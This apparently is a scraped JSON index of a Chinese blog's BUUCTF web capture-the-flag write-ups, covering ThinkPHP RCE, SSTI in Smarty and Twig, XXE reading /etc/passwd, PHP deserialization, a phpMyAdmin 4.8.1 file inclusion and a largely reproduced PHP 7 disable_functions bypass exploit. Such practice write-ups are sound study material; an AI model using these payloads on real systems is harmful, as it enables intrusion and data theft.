","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gxyctf2019babyupload"},{"categories":["CTF"],"content":"[BJDCTF 2nd]old-hackThinkPHP的漏洞 ThinkPHP5 5.0.23 _method=__construct\u0026filter[]=system\u0026method=get\u0026server[REQUEST_METHOD]=cat /flag ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf-2ndold-hack"},{"categories":["CTF"],"content":"[安洵杯 2019]easy_web看url一个img和cmd，页面中有一个图片的标签，和一个md5 is funny ~。把url中img的值进行解码发现图片名为555.png，尝试用同样的编码方式读取index.php，加密的编码依次为：hex–\u003ebase64–\u003ebase64。 index.php \u003c?php error_reporting(E_ALL || ~ E_NOTICE); header('content-type:text/html;charset=utf-8'); $cmd = $_GET['cmd']; if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0\u0026cmd='); $file = hex2bin(base64_decode(base64_decode($_GET['img']))); $file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file); if (preg_match(\"/flag/i\", $file)) { echo '\u003cimg src =\"./ctf3.jpeg\"\u003e'; die(\"xixi～ no flag\"); } else { $txt = base64_encode(file_get_contents($file)); echo \"\u003cimg src='data:image/gif;base64,\" . $txt . \"'\u003e\u003c/img\u003e\"; echo \"\u003cbr\u003e\"; } echo $cmd; echo \"\u003cbr\u003e\"; if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\\u0026[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|\u003c|\u003e/i\", $cmd)) { echo(\"forbid ~\"); echo \"\u003cbr\u003e\"; } else { if ((string)$_POST['a'] !== (string)$_POST['b'] \u0026\u0026 md5($_POST['a']) === md5($_POST['b'])) { echo `$cmd`; } else { echo (\"md5 is funny ~\"); } } ?\u003e \u003chtml\u003e \u003cstyle\u003e body{ background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC; } \u003c/style\u003e \u003cbody\u003e \u003c/body\u003e \u003c/html\u003e 我不知道为什么，我的bp一定要在\u0026前加一个空格才可以通过。 ?cmd=uniq%20/flag POST a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 \u0026b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 读文件的绕过有 1 more:一页一页的显示档案内容 2 less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页 3 head:查看头几行 4 tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 5 tail:查看尾几行 6 nl：显示的时候，顺便输出行号 7 od:以二进制的方式读取档案内容 8 vi:一种编辑器，这个也可以查看 9 vim:一种编辑器，这个也可以查看 10 sort:可以查看 11 uniq:可以查看 12 file -f:报错出具体内容 摘自命令执行漏洞利用及绕过方式总结。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#安洵杯-2019easy_web"},{"categories":["CTF"],"content":"[BJDCTF2020]Mark loves catgit泄露 flag.php \u003c?php $flag = file_get_contents('/flag'); index.php \u003c?php include 'flag.php'; $yds = \"dog\"; $is = \"cat\"; $handsome = 'yds'; foreach($_POST as $x =\u003e $y){ $$x = $y; } foreach($_GET as $x =\u003e $y){ $$x = $$y; } foreach($_GET as $x =\u003e $y){ if($_GET['flag'] === $x \u0026\u0026 $x !== 'flag'){ exit($handsome); } } if(!isset($_GET['flag']) \u0026\u0026 !isset($_POST['flag'])){ exit($yds); } if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){ exit($is); } echo \"the flag is: \".$flag; 尝试输出$flag即可。exit()函数退出时也会输出。 第一个不可能实现，如果POST或GET传入flag的话必然导致$flag修改，那么正好符合第二个if。 payload GET ?yds=flag POST(任意，但是需要保证不传flag) is=233flag ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf2020mark-loves-cat"},{"categories":["CTF"],"content":"[BJDCTF2020]The mystery of iphint.php里面有注释 Do you know why i know your ip? 去flag.php尝试加入请求头x-forward-x、client-ip发现ip可以改变。然后是自己感觉网页很简单，突破点在请求头中，尝试了下ssti模板注入，发现成功了。 尝试了几个ssti的payload不行，但是提示了 Uncaught –\u003e Smarty Compiler:………………… 得知了这个是Smarty引擎，在网上尝试搜索这种类型的注入 请求： X-Forwarded-For: {system('cat /flag')} SSTI神器–Tplmap，看介绍是和sqlmap差不多的工具。 这个师傅的博客写的很全：https://www.cnblogs.com/R3col/p/12746485.html，所有类型的模板引擎payload都有，注入之前需要先确定类型。 CTF SSTI(服务器模板注入) flask之ssti模版注入从零到入门 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf2020the-mystery-of-ip"},{"categories":["CTF"],"content":"[GWCTF 2019]我有一个数据库页面是乱码，想知道内容了可以看下图 $$各种乱码图 对照的是古文码。是以GBK方式读取UTF-8编码的中文，我举个例子，使用vscode，先通过编码保存–\u003eGBK，再通过编码打开–\u003eUTF-8。内容如下 我有一个数据库，但里面什么也没有~ 不信你找 提示是数据库了，那么果断尝试PHPmyadmin，访问成功，然后查看下版本，去网上搜索对应版本的漏洞 phpmyadmin4.8.1后台getshell payload /phpmyadmin/index.php?target=db_sql.php%253f../../../../../../flag 可以包含任意文件，理应可以包含数据库文件，在数据库表字段写shell，没成不知道数据库文件名称 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gwctf-2019我有一个数据库"},{"categories":["CTF"],"content":"2021.03.01 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#20210301"},{"categories":["CTF"],"content":"[BJDCTF2020]ZJCTF，不过如此绕过 第一层用php伪协议中的data封装流。PHP伪协议总结 然后进入文件包含，提示包含next.php文件，还是使用php伪协议中的php://filter payload ?text=data://text/plain,I have a dream\u0026file=php://filter/convert.base64-encode/resource=next.php 读出来的next.php PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K base64解码： \u003c?php $id = $_GET['id']; $_SESSION['id'] = $id; function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str ); } foreach($_GET as $re =\u003e $str) { echo complex($re, $str). \"\\n\"; } function getFlag(){ @eval($_GET['cmd']); } 这里想要通过需要知道一个深入研究 preg_replace /e 模式下的代码漏洞问题 最终payload next.php?\\S*=${getFlag()}\u0026cmd=system('cat /flag'); ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf2020zjctf不过如此"},{"categories":["CTF"],"content":"[De1CTF 2019]SSRF Me进入页面是一堆源码，之前写过flask的可以大概理出来几个重要的点，但是还是贴一下源码 #! /usr/bin/env python # encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding('latin1') app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if (not os.path.exists(self.sandbox)): # SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if \"scan\" in self.action: tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w') resp = scan(self.param) # 此处是文件读取得注入点 if (resp == \"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if \"read\" in self.action: f = open(\"./%s/result.txt\" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False # generate Sign For Action Scan. @app.route(\"/geneSign\", methods=['GET', 'POST']) def geneSign(): param = urllib.unquote(request.args.get(\"param\", \"\")) action = \"scan\" return getSign(action, param) @app.route('/De1ta', methods=['GET', 'POST']) def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if (waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route('/') def index(): return open(\"code.txt\", \"r\").read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \"Connection Timeout\" def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check = param.strip().lower() if check.startswith(\"gopher\") or check.startswith(\"file\"): return True else: return False if __name__ == '__main__': app.debug = False app.run(host='0.0.0.0') 简单说明思路： 请求部分(代码69-78)： 获取的param是需要打开文件的名称，提示中已经写出flag在flag.txt。根据使用函数，可以使用get传参 读取文件需要在cookie里传入参数action、sign action是执行类型，代码33行和43行指出了两种。 sing是用来验证param和action的，相关函数在94行，稍后做解释 获取sign部分(61-66) 获取param，action固定为scan 返回(secert_key + param + action)组合的sign 所以我们需要先获取sign，获取sign时包含的param和action，再去请求文件获得flag，并且获取flag时会验证sign是否符合格式(代码32行、54-58行)。因为获取sign时action固定为scan(代码65)，但是请求中我们需要使用read才可以访问，所以构造payload。 假如param=flag.txt，获取sign时action固定值为scan，此时的sign为(使用|仅为说明使用，其实字符串是相连的) secert_key|flag.txt|scan 但是我们想要使用read，可以构造param为flag.txtread secert_key|flag.txtread|scan 再进行验证的时候我们传入param为flag.txt，action为readscan即可符合格式。 secert_key|flag.txt|readscan 请求/geneSign /geneSign?param=flag.txtread 得到 9017a8826b7267833f22c0f22d90fea7 得到sign以后，再去访问/De1ta /De1ta?param=flag.txt sign=9017a8826b7267833f22c0f22d90fea7;action=readscan; 获得flag ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#de1ctf-2019ssrf-me"},{"categories":["CTF"],"content":"[网鼎杯 2020 朱雀组]phpweb看源码，有一个表单和自动提交的js。表单参数为 func=date\u0026p=Y-m-d+h%3Ai%3As+a 是一个获取时间的函数。尝试注入点func是函数，就试试常见的读取文件函数readfile可以读取index.php \u003c?php $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\", \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\"); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == \"string\") { return $result; } else {return \"\";} } class Test { var $p = \"Y-m-d h:i:s a\"; var $func = \"date\"; function __destruct() { if ($this-\u003efunc != \"\") { echo gettime($this-\u003efunc, $this-\u003ep); } } } $func = $_REQUEST[\"func\"]; $p = $_REQUEST[\"p\"]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(\"Hacker...\"); } } ?\u003e 我没思路了，看的网上wp。使用了反序列化unserialize，实在是太斯巴拉西了。 先构造Test对象，对象销毁时也会执行gettime函数执行payload，记得要加一层urlencode，不然会被拦下 \u003c?php class Test { var $p = \"ls ../../../../\"; var $func = \"system\"; } $s=new Test(); echo urlencode(serialize($s)); #unserialize O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A15%3A%22ls+..%2F..%2F..%2F..%2F%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D wp使用的是find指令找的flag地址，但是我执行以后出现503，应该是服务器防火墙阳气过盛，但是使用ls的方法一个一个找也能找得到。flag在/tmp/flagoefiu4r93 POST func=unserialize\u0026p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22ls+..%2F..%2F..%2F..%2Ftmp%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D 最后读文件 func=readfile\u0026p=../../../../tmp/flagoefiu4r93 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#网鼎杯-2020-朱雀组phpweb"},{"categories":["CTF"],"content":"[GKCTF2020]CheckIN是用base64解码执行代码，使用Ginkgo接收，GET、POST都可以 phpinfo(); cGhwaW5mbygpOw== 查看php版本和disable_function，被禁用一大堆，包括好多命令执行函数 可以使用print_r()、var_dump()输出，scandir()看目录，file_get_contents()读文件内容。 scandir根目录查看 ?Ginkgo=cHJpbnRfcihzY2FuZGlyKCcuLi8uLi8uLi8uLi8nKSk7 又一个flag读不出来，但是还有一个readflag可以读出来，文件前缀是ELF，百度以后知道是linux的可执行文件 传码 eval($_POST[1]); ZXZhbCgkX1BPU1RbMV0pOw== 蚁剑连接。但是system()被禁，只能使用disable_function绕过，之前有一道RCE ME也是用绕过，但是在这道题不管用了。在网上看wp知道了另一种，利用php7堆溢出触发，我修改了下payload部分(11行)： \u003c?php # PHP 7.0-7.3 disable_functions bypass PoC (*nix only) # # Bug: https://bugs.php.net/bug.php?id=72530 # # This exploit should work on all PHP 7.0-7.3 versions # # Author: https://github.com/mm0r1 pwn(\"../../.././readflag\"); #这里是想要执行的命令 function pwn($cmd) { global $abc, $helper; function str2ptr(\u0026$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j \u003e= 0; $j--) { $address \u003c\u003c= 8; $address |= ord($str[$p+$j]); } return $address; } function ptr2str($ptr, $m = 8) { $out = \"\"; for ($i=0; $i \u003c $m; $i++) { $out .= chr($ptr \u0026 0xff); $ptr \u003e\u003e= 8; } return $out; } function write(\u0026$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i \u003c $n; $i++) { $str[$p + $i] = chr($v \u0026 0xff); $v \u003e\u003e= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-\u003ea); if($s != 8) { $leak %= 2 \u003c\u003c ($s * 8) - 1; } return $leak; } function parse_elf($base) { $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i \u003c $e_phnum; $i++) { $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 \u0026\u0026 $p_flags == 6) { # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; } else if($p_type == 1 \u0026\u0026 $p_flags == 5) { # PT_LOAD, PF_Read_exec $text_size = $p_memsz; } } if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; } function get_basic_funcs($base, $elf) { list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i \u003c $data_size / 8; $i++) { $leak = leak($data_addr, $i * 8); if($leak - $base \u003e 0 \u0026\u0026 $leak - $base \u003c $data_addr - $base) { $deref = leak($leak); # 'constant' constant check if($deref != 0x746e6174736e6f63) continue; } else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base \u003e 0 \u0026\u0026 $leak - $base \u003c $data_addr - $base) { $deref = leak($leak); # 'bin2hex' constant check if($deref != 0x786568326e6962) continue; } else continue; return $data_addr + $i * 8; } } function get_binary_base($binary_leak) { $base = 0; $start = $binary_leak \u0026 0xfffffffffffff000; for($i = 0; $i \u003c 0x1000; $i++) { $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) { # ELF header return $addr; } } } function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) { # system return leak($addr + 8); } $addr += 0x20; } while($f_entry != 0); return false; } class ryat { var $ryat; var $chtg; function __destruct() { $this-\u003echtg = $this-\u003eryat; $this-\u003eryat = 1; } } class Helper { public $a, $b, $c, $d; } if(stristr(PHP_OS, 'WIN')) { die('This PoC is for *nix systems only.'); } $n_alloc = 10; # increase this value if you get segfaults $contiguous = []; for($i = 0; $i \u003c $n_alloc; $i++) $contiguous[] = str_repeat('A', 79); $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\"ryat\":2:{s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;}}i:1;i:3;i:2;R:5;}'; $out = unserialize($poc); gc_collect_cycles(); $v = []; $v[0] = ptr2str(0, 79); unset($v); $abc = $out[2][0]; $helper = new Helper; $helper-\u003eb = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\"UAF failed\"); } # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($ab","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gkctf2020checkin"},{"categories":["CTF"],"content":"03.02 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#0302"},{"categories":["CTF"],"content":"[NCTF2019]Fake XML cookbook根据题目是XML，首先想到是XXE，虽然咱没学过但是可以去搜简单的payload。 使用bp抓个包，POST中传入的是标签格式，可以确定是XXE类型的题目 POST Content-Type: application/xml; \u003cuser\u003e\u003cusername\u003e1\u003c/username\u003e\u003cpassword\u003e2\u003c/password\u003e\u003c/user\u003e 去摸一个payload试试 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE test [ \u003c!ENTITY admin SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u003cuser\u003e\u003cusername\u003e\u0026admin;\u003c/username\u003e\u003cpassword\u003e123456\u003c/password\u003e\u003c/user\u003e 成功读取文件 把路径改为/flag，获得flag ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#nctf2019fake-xml-cookbook"},{"categories":["CTF"],"content":"[ASIS 2019]Unicorn shop这道题绝活。学到了unicode的安全问题：浅谈Unicode设计的安全性，看了wp。 进入网站一个本杰明·富兰克林至理名言： 金钱从来不会使人幸福，也不会使人幸福；它的本性中没有任何东西可以产生幸福。幸福拥有的越多，想要的就越多 差点信了，我就要赚钱花(小声bb) 下面两个输入框，一个ID一个钱，上面一个独角兽商品列表，一看就是让买东西，但是1-3商品输入ID都提示错误，只有第四个可以买到，但是第四个输入钱的时候只能输入1位，然鹅4号价格是1377，显然买不到，输入多个又提示 ，所以思路就是找一个unicode字符，它的数字格式值是大于1377的。 一个和unicode有关的网站：https://www.compart.com/en/unicode 网站导航栏找到Character Categories分类，这个下有三个和数相关的：Decimal Number、Letter Number、Other Number，第一个里面都是正常数值的unicode，建议去后面两个找。怎么找：Ctrl+F搜索thousand，找1377以上的都可。 我选的是这个፼数值是1w，直接传传不过去，使用url编码一次再传。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#asis-2019unicorn-shop"},{"categories":["CTF"],"content":"[BJDCTF2020]Cookie is so stable这道题和The mystery of ip的网站一样，还有可能是ssti，hint.php的注释里有 Why not take a closer look at cookies? 去flag.php提交个1之后，看cookie为 Cookie: PHPSESSID=dba9ac7cbddf1983cbac508b01f8cdf2; user=1 一目了然，接下来就是找payload。再使用之前的 {system('cat /flag')} 被拦下来了，说明加强了过滤。在这之后去看了wp，网上的wp都是直接给出了payload {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"whoami\")}} 我是受了这位师傅的文章启发，又去结合了下这道题的源码才搞明白。 这道题在渲染之前使用了twig模板： Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。 我同样在题目的源码中找到了render()方法和Twig_Environment配置信息 然后payload的具体原理在的Environment.php中,贴一下和payload相关部分： 先执行{{_self.env.registerUndefinedFilterCallback(\"exec\")}}调用了registerUndefinedFilterCallback()函数(图中884行)，注册了一个未定义的函数到filterCallbacks全局变量中 接着执行{{_self.env.getFilter(\"whoami\")}}调用了getFilter()函数，并传入变量$name值为执行的命令，当函数执行到图中代码875行时，进入循环执行了call_user_func()，这个函数大伙肯定不陌生：call_user_func 可以把第一个参数作为回调函数调用，调用的参数来源就是第一步中注册的filterCallbacks全局变量，里边已经躺好了一个刚刚注册的exec，至此就形成了payload ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf2020cookie-is-so-stable"},{"categories":["CTF"],"content":"小彩蛋现在(2021年3月2日16:32:44)刚好做完题，想回到BUU上整理过程，发现502了，然后去群里就看到了 挺草的记一下。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#小彩蛋"},{"categories":["CTF"],"content":"[CISCN 2019 初赛]Love Math源码： \u003c?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET['c'])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) \u003e= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';'); } 快被搞死了，是一道有过滤限制的RCE，半天没有头绪就去看wp了。 刷题记录：[CISCN 2019 初赛]Love Math 最后自己琢磨出来了一个payload，思路当然还是参考上面师傅博客的。 利用$whitelist里的函数名称和数字遍历异或^，Fuzz找出来需要的字母，然后拼接一个_GET传参执行命令。 Fuzz的代码 \u003c?php $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; $exp=''; for ($i=0; $i \u003c count($whitelist); $i++) { for ($j=0; $j \u003c 1000; $j++) { $exp=$whitelist[$i]^$j.\"\"; echo $whitelist[$i].\"^\".$j.\"----\".$exp; echo \"\\n\"; } } 需要知道的有，php某个版本以后可以使用函数名加()的方式调用函数，如 \u003c?php echo base_convert(\"strtoupper\", 36, 10); $cos=base_convert(\"2927671435926243\", 10, 36); echo \"\\n\".$cos(\"abc\"); 上面代码是把字符串strtoupper赋值到变量$cos，然后直接使用$cos()执行strtoupper()函数。代码中使用base_convert函数也是这道题的一种思路哦。﹙ˊ_\u003eˋ﹚ 还需要知道的是异或的时候会提示：字符串和数字不能直接异或，使用括号()括起来就可以了。$如果直接拼接到字符串上也是不可以的，需要使用形如$$cos才可以正确的指向变量。 最终payload： ?c=$cos=(is_finite^(6).(4)).(rad2deg^(7).(5));$cos=$$cos;$cos{0}($cos{1})\u00260=system\u00261=cat /flag 